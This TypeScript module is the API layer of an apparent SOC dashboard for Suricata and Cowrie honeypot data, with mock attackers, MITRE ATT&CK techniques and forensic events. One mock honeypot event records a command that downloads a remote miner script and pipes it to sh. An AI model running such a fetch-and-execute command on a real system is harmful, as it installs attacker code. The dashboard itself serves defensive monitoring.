/**
 * API Service for Sentinel CTI SOC Console.
 * Automatically integrates with FastAPI backend on http://localhost:8000
 * and falls back to a high-fidelity mock replica if backend is offline.
 */

const API_BASE = 'http://localhost:8000';

export interface AttackerGeo {
  country: string | null;
  region: string | null;
  city: string | null;
  isp: string | null;
  asn: string | null;
  lat?: number | null;
  lon?: number | null;
}

export interface Attacker {
  src_ip: string;
  total_events: number;
  unique_techniques: number;
  unique_tactics: number;
  suricata_events: number;
  cowrie_events: number;
  risk_score: number;
  threat_level: 'critical' | 'high' | 'medium';
  created_at?: string;
  geo?: AttackerGeo;
}

export interface DashboardSummary {
  total_attackers: number;
  critical_attackers: number;
  total_suricata_events: number;
  total_cowrie_events: number;
  top_tactic: string;
}

export interface AttackTechnique {
  technique_id: string;
  technique_name: string;
  occurrences: number;
}

export interface AttackTactic {
  tactic: string;
  occurrences: number;
}

export interface CVEDetails {
  cve_id: string;
  title: string;
  description: string;
  base_score: number | null;
  base_severity: string | null;
  attack_vector: string | null;
  vendor_name: string | null;
  product_name: string | null;
  affected_versions: string | null;
}

export interface ForensicEvent {
  id: number;
  timestamp: string;
  src_ip: string;
  dest_ip: string;
  src_port: number;
  dest_port: number;
  proto: string;
  app_proto?: string;
  alert_signature: string;
  category: string;
  severity: number;
  flow_id?: number;
  technique_id: string | null;
  technique_name: string | null;
  tactic: string | null;
  technique_description: string | null;
  technique_url: string | null;
  source_type: 'suricata' | 'cowrie';
  cve_id: string | null;
  cve_details: CVEDetails | null;
}


// Global high-fidelity mock data registry
const MOCK_ATTACKERS: Attacker[] = [
  { src_ip: '194.26.135.84', total_events: 1845, unique_techniques: 12, unique_tactics: 6, suricata_events: 1420, cowrie_events: 425, risk_score: 96, threat_level: 'critical', created_at: '2026-05-20T11:42:15Z' },
  { src_ip: '85.203.47.112', total_events: 1290, unique_techniques: 9, unique_tactics: 4, suricata_events: 980, cowrie_events: 310, risk_score: 89, threat_level: 'critical', created_at: '2026-05-20T12:05:30Z' },
  { src_ip: '45.142.195.6', total_events: 940, unique_techniques: 8, unique_tactics: 5, suricata_events: 0, cowrie_events: 940, risk_score: 82, threat_level: 'critical', created_at: '2026-05-20T12:15:10Z' },
  { src_ip: '103.214.144.18', total_events: 1104, unique_techniques: 11, unique_tactics: 7, suricata_events: 850, cowrie_events: 254, risk_score: 85, threat_level: 'critical', created_at: '2026-05-20T08:33:04Z' },
  { src_ip: '185.220.101.42', total_events: 780, unique_techniques: 6, unique_tactics: 3, suricata_events: 780, cowrie_events: 0, risk_score: 74, threat_level: 'high', created_at: '2026-05-20T13:48:22Z' },
  { src_ip: '91.240.118.15', total_events: 642, unique_techniques: 7, unique_tactics: 3, suricata_events: 120, cowrie_events: 522, risk_score: 71, threat_level: 'high', created_at: '2026-05-20T14:10:05Z' },
  { src_ip: '198.51.100.77', total_events: 412, unique_techniques: 4, unique_tactics: 2, suricata_events: 412, cowrie_events: 0, risk_score: 58, threat_level: 'medium', created_at: '2026-05-20T14:55:00Z' },
  { src_ip: '203.0.113.159', total_events: 310, unique_techniques: 3, unique_tactics: 2, suricata_events: 0, cowrie_events: 310, risk_score: 42, threat_level: 'medium', created_at: '2026-05-20T15:02:18Z' },
  { src_ip: '77.247.110.12', total_events: 590, unique_techniques: 5, unique_tactics: 3, suricata_events: 340, cowrie_events: 250, risk_score: 63, threat_level: 'high', created_at: '2026-05-20T10:11:45Z' },
  { src_ip: '109.202.107.5', total_events: 280, unique_techniques: 4, unique_tactics: 2, suricata_events: 280, cowrie_events: 0, risk_score: 48, threat_level: 'medium', created_at: '2026-05-20T09:44:12Z' }
];

const MOCK_SUMMARY: DashboardSummary = {
  total_attackers: 104,
  critical_attackers: 14,
  total_suricata_events: 89350,
  total_cowrie_events: 34210,
  top_tactic: 'Credential Access'
};

const MOCK_TECHNIQUES: AttackTechnique[] = [
  { technique_id: 'T1110', technique_name: 'Brute Force', occurrences: 15420 },
  { technique_id: 'T1078', technique_name: 'Valid Accounts', occurrences: 9840 },
  { technique_id: 'T1190', technique_name: 'Exploit Public-Facing Application', occurrences: 7420 },
  { technique_id: 'T1059', technique_name: 'Command and Scripting Interpreter', occurrences: 6510 },
  { technique_id: 'T1046', technique_name: 'Network Service Discovery', occurrences: 5200 },
  { technique_id: 'T1505', technique_name: 'Server Software Component', occurrences: 3820 },
  { technique_id: 'T1021', technique_name: 'Remote Services', occurrences: 3100 },
  { technique_id: 'T1571', technique_name: 'Non-Standard Port', occurrences: 2900 }
];

const MOCK_TACTICS: AttackTactic[] = [
  { tactic: 'Credential Access', occurrences: 25260 },
  { tactic: 'Execution', occurrences: 18450 },
  { tactic: 'Initial Access', occurrences: 14210 },
  { tactic: 'Discovery', occurrences: 9840 },
  { tactic: 'Lateral Movement', occurrences: 6100 },
  { tactic: 'Command and Control', occurrences: 5200 },
  { tactic: 'Persistence', occurrences: 4500 }
];

// Helper to safely execute fetch with fallback
async function fetchWithFallback<T>(url: string, mockData: T): Promise<T> {
  try {
    const res = await fetch(url);
    if (!res.ok) {
      throw new Error(`HTTP error! status: ${res.status}`);
    }
    return await res.json() as T;
  } catch (error) {
    console.warn(`API call failed to ${url}. Falling back to mock data.`, error);
    return new Promise((resolve) => setTimeout(() => resolve(mockData), 300));
  }
}

export const apiService = {
  /**
   * Fetch top threat actors
   */
  async getTopAttackers(limit = 20): Promise<{ count: number; results: Attacker[] }> {
    return fetchWithFallback<{ count: number; results: Attacker[] }>(
      `${API_BASE}/attackers/top?limit=${limit}`,
      { count: MOCK_ATTACKERS.length, results: MOCK_ATTACKERS.slice(0, limit) }
    );
  },

  /**
   * Fetch a single threat actor detail by IP
   */
  async getAttackerDetails(srcIp: string): Promise<Attacker | { message: string }> {
    const defaultData = MOCK_ATTACKERS.find(a => a.src_ip === srcIp) || { message: 'Attacker not found' };
    return fetchWithFallback<Attacker | { message: string }>(
      `${API_BASE}/attackers/details?src_ip=${encodeURIComponent(srcIp)}`,
      defaultData
    );
  },

  /**
   * Fetch central operations dashboard executive metrics
   */
  async getDashboardSummary(): Promise<DashboardSummary> {
    return fetchWithFallback<DashboardSummary>(
      `${API_BASE}/attackers/dashboard/summary`,
      MOCK_SUMMARY
    );
  },

  /**
   * Fetch critical risk severity level threat actors
   */
  async getCriticalAttackers(limit = 20): Promise<{ count: number; results: Attacker[] }> {
    const criticalList = MOCK_ATTACKERS.filter(a => a.threat_level === 'critical');
    return fetchWithFallback<{ count: number; results: Attacker[] }>(
      `${API_BASE}/attackers/critical?limit=${limit}`,
      { count: criticalList.length, results: criticalList.slice(0, limit) }
    );
  },

  /**
   * Fetch top exploited techniques
   */
  async getTopTechniques(limit = 20): Promise<{ count: number; results: AttackTechnique[] }> {
    return fetchWithFallback<{ count: number; results: AttackTechnique[] }>(
      `${API_BASE}/attack-techniques/top?limit=${limit}`,
      { count: MOCK_TECHNIQUES.length, results: MOCK_TECHNIQUES.slice(0, limit) }
    );
  },

  /**
   * Fetch top exploited tactics
   */
  async getTopTactics(limit = 20): Promise<{ count: number; results: AttackTactic[] }> {
    return fetchWithFallback<{ count: number; results: AttackTactic[] }>(
      `${API_BASE}/attack-tactics/top?limit=${limit}`,
      { count: MOCK_TACTICS.length, results: MOCK_TACTICS.slice(0, limit) }
    );
  },

  /**
   * Fetch forensic log event queue for a given threat actor (Suricata NIDS & Cowrie Honeypot)
   */
  async getAttackerEvents(srcIp: string, limit = 50): Promise<{ count: number; results: ForensicEvent[] }> {
    return fetchWithFallback<{ count: number; results: ForensicEvent[] }>(
      `${API_BASE}/attackers/${encodeURIComponent(srcIp)}/events?limit=${limit}`,
      generateMockEvents(srcIp)
    );
  }
};

function generateMockEvents(srcIp: string): { count: number; results: ForensicEvent[] } {
  const events: ForensicEvent[] = [
    {
      id: 1,
      timestamp: new Date(Date.now() - 1000 * 60 * 5).toISOString(),
      src_ip: srcIp,
      dest_ip: '10.0.0.15',
      src_port: 48924,
      dest_port: 8000,
      proto: 'TCP',
      app_proto: 'HTTP',
      alert_signature: 'ET WEB_SPECIFIC_APPS React Server Components React2Shell Unsafe Flight Protocol Property Access (CVE-2025-55182)',
      category: 'Attempted Information Leak',
      severity: 1,
      flow_id: 85938472,
      technique_id: 'T1190',
      technique_name: 'Exploit Public-Facing Application',
      tactic: 'initial-access',
      technique_description: 'Adversaries may attempt to exploit a weakness in an Internet-facing computer or program to gain initial access to a system.',
      technique_url: 'https://attack.mitre.org/techniques/T1190',
      source_type: 'suricata',
      cve_id: 'CVE-2025-55182',
      cve_details: {
        cve_id: 'CVE-2025-55182',
        title: 'React Server Components Deserialization Remote Code Execution',
        description: 'React Server Components React2Shell deserialization vulnerability allows unauthenticated attackers to execute arbitrary system code via the flight protocol headers.',
        base_score: 10.0,
        base_severity: 'CRITICAL',
        attack_vector: 'NETWORK',
        vendor_name: 'Meta',
        product_name: 'React Server Components',
        affected_versions: '<= 19.0.0'
      }
    },
    {
      id: 2,
      timestamp: new Date(Date.now() - 1000 * 60 * 15).toISOString(),
      src_ip: srcIp,
      dest_ip: '10.0.0.4',
      src_port: 22,
      dest_port: 22,
      proto: 'TCP',
      alert_signature: 'cowrie.login.success',
      category: 'SSH Honey Sensor',
      severity: 1,
      technique_id: 'T1078',
      technique_name: 'Valid Accounts',
      tactic: 'defense-evasion',
      technique_description: 'Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.',
      technique_url: 'https://attack.mitre.org/techniques/T1078',
      source_type: 'cowrie',
      cve_id: null,
      cve_details: null
    },
    {
      id: 3,
      timestamp: new Date(Date.now() - 1000 * 60 * 16).toISOString(),
      src_ip: srcIp,
      dest_ip: '10.0.0.4',
      src_port: 39485,
      dest_port: 22,
      proto: 'TCP',
      alert_signature: 'wget http://194.26.135.84/miner.sh -O - | sh',
      category: 'SSH Honey Sensor',
      severity: 1,
      technique_id: 'T1059',
      technique_name: 'Command and Scripting Interpreter',
      tactic: 'execution',
      technique_description: 'Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries.',
      technique_url: 'https://attack.mitre.org/techniques/T1059',
      source_type: 'cowrie',
      cve_id: null,
      cve_details: null
    },
    {
      id: 4,
      timestamp: new Date(Date.now() - 1000 * 60 * 20).toISOString(),
      src_ip: srcIp,
      dest_ip: '10.0.0.15',
      src_port: 48512,
      dest_port: 8000,
      proto: 'TCP',
      app_proto: 'HTTP',
      alert_signature: 'ET WEB_SPECIFIC_APPS TVT language Command Injection Attempt (CVE-2025-34036)',
      category: 'Web Application Attack',
      severity: 2,
      flow_id: 85938102,
      technique_id: 'T1190',
      technique_name: 'Exploit Public-Facing Application',
      tactic: 'initial-access',
      technique_description: 'Adversaries may attempt to exploit a weakness in an Internet-facing computer or program to gain initial access to a system.',
      technique_url: 'https://attack.mitre.org/techniques/T1190',
      source_type: 'suricata',
      cve_id: 'CVE-2025-34036',
      cve_details: {
        cve_id: 'CVE-2025-34036',
        title: 'Shenzhen TVT CCTV-DVR Command Injection',
        description: 'Command injection vulnerability in Shenzhen TVT CCTV-DVR firmware allows remote attackers to execute arbitrary shell commands via the language parameter.',
        base_score: 9.8,
        base_severity: 'CRITICAL',
        attack_vector: 'NETWORK',
        vendor_name: 'Shenzhen TVT Digital Technology',
        product_name: 'CCTV-DVR Firmware',
        affected_versions: '<= 3.2.1'
      }
    },
    {
      id: 5,
      timestamp: new Date(Date.now() - 1000 * 60 * 30).toISOString(),
      src_ip: srcIp,
      dest_ip: '10.0.0.4',
      src_port: 22,
      dest_port: 22,
      proto: 'TCP',
      alert_signature: 'cowrie.login.failed',
      category: 'SSH Honey Sensor',
      severity: 3,
      technique_id: 'T1110',
      technique_name: 'Brute Force',
      tactic: 'credential-access',
      technique_description: 'Adversaries may use brute force techniques to attempt credential access.',
      technique_url: 'https://attack.mitre.org/techniques/T1110',
      source_type: 'cowrie',
      cve_id: null,
      cve_details: null
    }
  ];
  return { count: events.length, results: events };
}

